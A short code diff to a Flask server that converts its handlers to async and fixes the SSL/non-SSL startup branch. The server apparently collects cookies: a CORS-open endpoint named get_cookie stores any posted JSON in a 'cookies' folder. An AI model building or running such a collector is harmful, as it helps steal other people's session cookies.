@@ -13,7 +13,7 @@ from flask_cors import CORS
 from config import *
 
 
-def save_data(data):
+async def save_data(data):
     get_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
 
     if os.path.isdir(f"{os.getcwd()}/cookies"):
@@ -30,10 +30,10 @@ CORS(app, resources=r'/*')
 
 
 @app.route('/request', methods=['POST'])
-def get_cookie():
+async def get_cookie():
     data = request.get_data().decode()
     data = json.loads(data)
-    save_data(data)
+    await save_data(data)
     return "success"
 
 
@@ -49,5 +49,5 @@ arg = arg.parse_args()
 if arg.ssl:
     ssl = (pem, key)
     app.run("0.0.0.0", port=5000, ssl_context=ssl)
-
-app.run("0.0.0.0", port=5000)
+else:
+    app.run("0.0.0.0", port=5000)
